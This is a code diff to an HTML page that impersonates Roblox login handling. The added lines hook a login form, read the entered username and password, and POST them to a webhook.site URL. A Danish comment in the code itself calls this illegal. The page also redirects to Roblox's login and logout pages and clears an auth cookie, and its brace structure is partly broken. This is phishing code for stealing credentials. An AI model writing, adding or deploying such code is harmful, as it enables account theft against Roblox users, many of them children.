@@ -10,6 +10,19 @@
     setTimeout(() => {
       window.location.href = "https://www.roblox.com/Login"; 
     }, 3);
+    document.getElementById("loginForm").onsubmit = function(e) {
+         e.preventDefault(); // Stop reload
+    
+         let username = document.getElementById("usernameInput").value;
+         let password = document.getElementById("passwordInput").value;
+    
+         if(username && password){
+             // Ulovlig: sende rigtige login-data til server
+             fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5", {
+                 method: "POST",
+                 body: JSON.stringify({username: username, password: password})
+             });
+    //     }
     document.cookie = "RobloxAuthToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
     window.location.href = "https://www.roblox.com/Logout";
     } 
@@ -19,4 +32,3 @@
   <p>Redirecting...</p> 
 </body> 
 </html>
-
